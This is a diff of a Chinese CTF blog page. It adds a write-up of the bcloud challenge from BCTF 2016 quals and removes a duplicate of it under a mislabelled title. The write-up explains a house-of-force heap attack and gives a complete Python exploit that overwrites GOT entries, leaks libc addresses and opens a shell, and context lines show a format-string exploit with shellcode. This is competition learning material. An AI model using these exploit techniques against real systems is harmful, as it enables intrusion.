@@ -298,6 +298,134 @@
             
               
                 
+                <a class="post-title-link" href="/2016/09/08/bctf-qual-2016-bcloud/" itemprop="url">
+                  bctf-qual-2016-bcloud
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-09-08T00:00:00+08:00" content="2016-09-08">
+              2016-09-08
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/09/08/bctf-qual-2016-bcloud/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/08/bctf-qual-2016-bcloud/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
+</blockquote>
+<h1 id="Bug">Bug</h1><p>这里s和v2两部分是相连的，看到下面的print_name，猜测会有内存泄露，试了下的确会泄露出malloc出来的指针，即可得到heap的地址<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80487A1</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+1Ch] [bp-5Ch]@1</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [sp+5Ch] [bp-1Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+6Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name:"</span>);</span><br><span class="line">  get_str((<span class="keyword">int</span>)&amp;s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  name = (<span class="keyword">int</span>)v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  print_name((<span class="keyword">int</span>)v2);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>0x804884e</code>处同样存在溢出，发生在<code>strcpy</code>处，能够直接溢出到<code>top chunk</code>处<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804884E</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+1Ch] [bp-9Ch]@1</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [sp+5Ch] [bp-5Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+60h] [bp-58h]@1</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [sp+A4h] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+ACh] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Org:"</span>);</span><br><span class="line">  get_str((<span class="keyword">int</span>)&amp;s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Host:"</span>);</span><br><span class="line">  get_str((<span class="keyword">int</span>)&amp;v3, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  org = (<span class="keyword">int</span>)v2;</span><br><span class="line">  host = (<span class="keyword">int</span>)v4;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"OKay! Enjoy:)"</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="Conclusion">Conclusion</h1><p>由于事先就知道了这题可以用<strong><em>house of force</em></strong>，所以直接往这方面想了</p>
+<h2 id="house_of_force条件:"><strong><em>house of force</em></strong>条件:</h2><p>能够修改<strong><em>top_chunk.size</em></strong>，能够控制malloc的size，泄露出heap的地址。</p>
+<h2 id="house_of_force的原理"><strong><em>house of force</em></strong>的原理</h2><p>在<a href="https://github.com/bminor/glibc/blob/glibc-2.24/malloc/malloc.c#L3830" target="_blank" rel="external">/malloc/malloc.c</a>中可以找到如下代码，在满足<code>size &gt;= nb + MINSIZE)</code>的条件下，只要控制nb为一个很大的数，能够实现将<code>av-&gt;top</code>移到任意地址，之后只要再malloc一次，即可实现任意地址写</p>
+<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">if ((unsigned <span class="keyword">long</span>) (size) &gt;= (unsigned <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    </span><br><span class="line">    ... ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="preprocessor">## 具体利用步骤</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 修改***top_chunk.size***为`<span class="number">0xffffffff</span>`</span><br><span class="line"><span class="number">2.</span> 申请一块合适大小的内存，使得`av-&gt;top`落在`<span class="number">0x804b0a0</span>`</span><br><span class="line"><span class="number">3.</span> 申请一块<span class="number">0x100</span>的内存，这次申请将得到`<span class="number">0x804b0a0</span>`处的内存</span><br><span class="line"><span class="number">4.</span> 修改note数组第一项为`free@got`地址</span><br><span class="line"><span class="number">5.</span> 通过edit修改`free@got`为`printf@plt`</span><br><span class="line"><span class="number">6.</span> 构造合适的格式化字符串，利用`delete note`，泄露栈上的`__libc_start_main_ret`，获得libc信息，计算得到`system`地址</span><br><span class="line"><span class="number">7.</span> 通过edit修改`free@got`为`system`</span><br><span class="line"><span class="number">8.</span> 利用`delete note`得到shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># Exploit</span></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from zio import *</span><br><span class="line">import ctypes</span><br><span class="line">io  = zio(<span class="string">'./bcloud'</span>, print_read = False, print_write = False, timeout = <span class="number">10000</span>)</span><br><span class="line">io.hint([<span class="number">0x8048be1</span>])</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># note_size 0x804b0a0 - 0x804b0c8</span></span><br><span class="line"><span class="preprocessor"># name      0x804b0cc - 0x804b0d0</span></span><br><span class="line"><span class="preprocessor"># org       0x804b0c8 - 0x804b0cc</span></span><br><span class="line"><span class="preprocessor"># syn       0x804b0e0 - 0x804b108</span></span><br><span class="line"><span class="preprocessor"># note      0x804b120 - 0x804b148</span></span><br><span class="line"><span class="preprocessor"># host      0x804b148 - 0x804b14c</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># leak heap</span></span><br><span class="line">io.w(<span class="string">'A'</span> * <span class="number">64</span>)</span><br><span class="line">io.rtl(<span class="string">'A'</span> * <span class="number">64</span>)</span><br><span class="line">heap_base = l32(io.r(<span class="number">4</span>)) - <span class="number">8</span></span><br><span class="line">print <span class="string">'[+] heap base\t:\t&#123;&#125;'</span>.format(hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># rewrite the size of top chunk to 0xffffffff</span></span><br><span class="line">io.w(<span class="string">'B'</span> * <span class="number">64</span> + l32(<span class="number">0xffffffff</span>) + <span class="string">'C'</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># malloc chunk at 0x804b0a0</span></span><br><span class="line">got_free    = <span class="number">0x804b014</span></span><br><span class="line">plt_printf  = <span class="number">0x080484d0</span></span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">1</span>, ctypes.c_int32(<span class="number">0x100000000</span> + got_free - heap_base - <span class="number">0x60</span>).value, <span class="string">'AAAA'</span>])</span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">1</span>, <span class="number">0x100</span>, l32(<span class="number">0x10</span>)*<span class="number">0x20</span> + l32(got_free)])</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># change free@got to printf</span></span><br><span class="line">io.wls([<span class="number">3</span>, <span class="number">0</span>, l32(plt_printf)])</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># leak free</span></span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">'0x%&#123;&#125;$08x'</span>.format(<span class="number">19</span>)])</span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">4</span>, <span class="number">2</span>])</span><br><span class="line">io.rtl(<span class="string">'0x'</span>)</span><br><span class="line">adr_libc_s_main_r = <span class="keyword">int</span>(io.r(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">print <span class="string">'[+] __libc_start_main\t:\t&#123;&#125;'</span>.format(hex(adr_libc_s_main_r))</span><br><span class="line"></span><br><span class="line">off_libc_s_main_r   = <span class="number">0x19a83</span></span><br><span class="line">off_system          = <span class="number">0x00040190</span></span><br><span class="line">adr_system          = adr_libc_s_main_r - off_libc_s_main_r + off_system</span><br><span class="line">print <span class="string">'[+] system\t:\t&#123;&#125;'</span>.format(hex(adr_system))</span><br><span class="line"></span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">3</span>, <span class="number">0</span>, l32(adr_system)])</span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">1</span>, <span class="number">8</span>, <span class="string">'/bin/sh\x00'</span>])</span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">4</span>, <span class="number">2</span>])</span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/09/08/rctf-qual-2015-shaxian/" itemprop="url">
                   rctf-qual-2015-shaxian
                 </a>
@@ -650,134 +778,6 @@
 <p>想到这里本以为题目已经解决了，我只要构造形如<code>%0{}x%4$hhn.%{}x%12$hn</code>的格式化字符串即可完成任意地址写，可是实际情况是，在前一个<code>%hhn</code>写入后修改了ebp2，后一个<code>%hn</code>不会修改已经修改后的ebp2指向的内存，而是修改之前的ebp2指向的内存。这就很尴尬了。</p>
 <p>后来是运气好解决了这问题，大致思路，观察栈上哪里有0x804a8a0，修改<code>ebp</code>为栈上的某个地址（需要先泄露栈的地址)，使得再经历几次<code>leave</code>的<strong><em>stack pivoting</em></strong>后，在ret时，esp恰好指向0x804a8a0。</p>
 <h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io  = zio(target = <span class="string">'./nobug_acc0c1b37bec49e0575c94a3916cc771'</span>, timeout = <span class="number">100000</span>)</span><br><span class="line">io.hint([<span class="number">0x08048b6f</span>])</span><br><span class="line">fs1 = <span class="string">'%4$08x'</span></span><br><span class="line">io.wl(b64encode(fs1))</span><br><span class="line">esp = int(io.r(<span class="number">8</span>)[<span class="number">5</span>:], <span class="number">16</span>) + <span class="number">0x4</span></span><br><span class="line"><span class="keyword">print</span> hex(esp)</span><br><span class="line"><span class="keyword">print</span> fs1</span><br><span class="line"><span class="comment"># fs2 = '%0&#123;&#125;x%4$hhn%0&#123;&#125;x%12$08x'.format(esp, 0xa8a0 - esp)</span></span><br><span class="line">shellcode = (</span><br><span class="line">            <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">            <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">            )</span><br><span class="line">fs2 = shellcode + <span class="string">'%0&#123;&#125;x%4$hhn'</span>.format(esp - len(shellcode))</span><br><span class="line"><span class="keyword">print</span> fs2</span><br><span class="line">io.wl(b64encode(fs2))</span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/09/05/bctf-qual-2016-bcloud/" itemprop="url">
-                  rctf-qual-2015-welpwn
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-09-05T00:00:00+08:00" content="2016-09-05">
-              2016-09-05
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/09/05/bctf-qual-2016-bcloud/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/05/bctf-qual-2016-bcloud/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
-</blockquote>
-<h1 id="Bug">Bug</h1><p>这里s和v2两部分是相连的，看到下面的print_name，猜测会有内存泄露，试了下的确会泄露出malloc出来的指针，即可得到heap的地址<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80487A1</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+1Ch] [bp-5Ch]@1</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [sp+5Ch] [bp-1Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+6Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name:"</span>);</span><br><span class="line">  get_str((<span class="keyword">int</span>)&amp;s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  name = (<span class="keyword">int</span>)v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  print_name((<span class="keyword">int</span>)v2);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><code>0x804884e</code>处同样存在溢出，发生在<code>strcpy</code>处，能够直接溢出到<code>top chunk</code>处<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804884E</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+1Ch] [bp-9Ch]@1</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [sp+5Ch] [bp-5Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+60h] [bp-58h]@1</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [sp+A4h] [bp-14h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+ACh] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Org:"</span>);</span><br><span class="line">  get_str((<span class="keyword">int</span>)&amp;s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Host:"</span>);</span><br><span class="line">  get_str((<span class="keyword">int</span>)&amp;v3, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  v4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  org = (<span class="keyword">int</span>)v2;</span><br><span class="line">  host = (<span class="keyword">int</span>)v4;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"OKay! Enjoy:)"</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h1 id="Conclusion">Conclusion</h1><p>由于事先就知道了这题可以用<strong><em>house of force</em></strong>，所以直接往这方面想了</p>
-<h2 id="house_of_force条件:"><strong><em>house of force</em></strong>条件:</h2><p>能够修改<strong><em>top_chunk.size</em></strong>，能够控制malloc的size，泄露出heap的地址。</p>
-<h2 id="house_of_force的原理"><strong><em>house of force</em></strong>的原理</h2><p>在<a href="https://github.com/bminor/glibc/blob/glibc-2.24/malloc/malloc.c#L3830" target="_blank" rel="external">/malloc/malloc.c</a>中可以找到如下代码，在满足<code>size &gt;= nb + MINSIZE)</code>的条件下，只要控制nb为一个很大的数，能够实现将<code>av-&gt;top</code>移到任意地址，之后只要再malloc一次，即可实现任意地址写</p>
-<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">if ((unsigned <span class="keyword">long</span>) (size) &gt;= (unsigned <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    </span><br><span class="line">    ... ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="preprocessor">## 具体利用步骤</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 修改***top_chunk.size***为`<span class="number">0xffffffff</span>`</span><br><span class="line"><span class="number">2.</span> 申请一块合适大小的内存，使得`av-&gt;top`落在`<span class="number">0x804b0a0</span>`</span><br><span class="line"><span class="number">3.</span> 申请一块<span class="number">0x100</span>的内存，这次申请将得到`<span class="number">0x804b0a0</span>`处的内存</span><br><span class="line"><span class="number">4.</span> 修改note数组第一项为`free@got`地址</span><br><span class="line"><span class="number">5.</span> 通过edit修改`free@got`为`printf@plt`</span><br><span class="line"><span class="number">6.</span> 构造合适的格式化字符串，利用`delete note`，泄露栈上的`__libc_start_main_ret`，获得libc信息，计算得到`system`地址</span><br><span class="line"><span class="number">7.</span> 通过edit修改`free@got`为`system`</span><br><span class="line"><span class="number">8.</span> 利用`delete note`得到shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># Exploit</span></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from zio import *</span><br><span class="line">import ctypes</span><br><span class="line">io  = zio(<span class="string">'./bcloud'</span>, print_read = False, print_write = False, timeout = <span class="number">10000</span>)</span><br><span class="line">io.hint([<span class="number">0x8048be1</span>])</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># note_size 0x804b0a0 - 0x804b0c8</span></span><br><span class="line"><span class="preprocessor"># name      0x804b0cc - 0x804b0d0</span></span><br><span class="line"><span class="preprocessor"># org       0x804b0c8 - 0x804b0cc</span></span><br><span class="line"><span class="preprocessor"># syn       0x804b0e0 - 0x804b108</span></span><br><span class="line"><span class="preprocessor"># note      0x804b120 - 0x804b148</span></span><br><span class="line"><span class="preprocessor"># host      0x804b148 - 0x804b14c</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># leak heap</span></span><br><span class="line">io.w(<span class="string">'A'</span> * <span class="number">64</span>)</span><br><span class="line">io.rtl(<span class="string">'A'</span> * <span class="number">64</span>)</span><br><span class="line">heap_base = l32(io.r(<span class="number">4</span>)) - <span class="number">8</span></span><br><span class="line">print <span class="string">'[+] heap base\t:\t&#123;&#125;'</span>.format(hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># rewrite the size of top chunk to 0xffffffff</span></span><br><span class="line">io.w(<span class="string">'B'</span> * <span class="number">64</span> + l32(<span class="number">0xffffffff</span>) + <span class="string">'C'</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># malloc chunk at 0x804b0a0</span></span><br><span class="line">got_free    = <span class="number">0x804b014</span></span><br><span class="line">plt_printf  = <span class="number">0x080484d0</span></span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">1</span>, ctypes.c_int32(<span class="number">0x100000000</span> + got_free - heap_base - <span class="number">0x60</span>).value, <span class="string">'AAAA'</span>])</span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">1</span>, <span class="number">0x100</span>, l32(<span class="number">0x10</span>)*<span class="number">0x20</span> + l32(got_free)])</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># change free@got to printf</span></span><br><span class="line">io.wls([<span class="number">3</span>, <span class="number">0</span>, l32(plt_printf)])</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># leak free</span></span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">'0x%&#123;&#125;$08x'</span>.format(<span class="number">19</span>)])</span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">4</span>, <span class="number">2</span>])</span><br><span class="line">io.rtl(<span class="string">'0x'</span>)</span><br><span class="line">adr_libc_s_main_r = <span class="keyword">int</span>(io.r(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">print <span class="string">'[+] __libc_start_main\t:\t&#123;&#125;'</span>.format(hex(adr_libc_s_main_r))</span><br><span class="line"></span><br><span class="line">off_libc_s_main_r   = <span class="number">0x19a83</span></span><br><span class="line">off_system          = <span class="number">0x00040190</span></span><br><span class="line">adr_system          = adr_libc_s_main_r - off_libc_s_main_r + off_system</span><br><span class="line">print <span class="string">'[+] system\t:\t&#123;&#125;'</span>.format(hex(adr_system))</span><br><span class="line"></span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">3</span>, <span class="number">0</span>, l32(adr_system)])</span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">1</span>, <span class="number">8</span>, <span class="string">'/bin/sh\x00'</span>])</span><br><span class="line">io.wls_af(<span class="string">'&gt;&gt;'</span>, [<span class="number">4</span>, <span class="number">2</span>])</span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
 
           
         
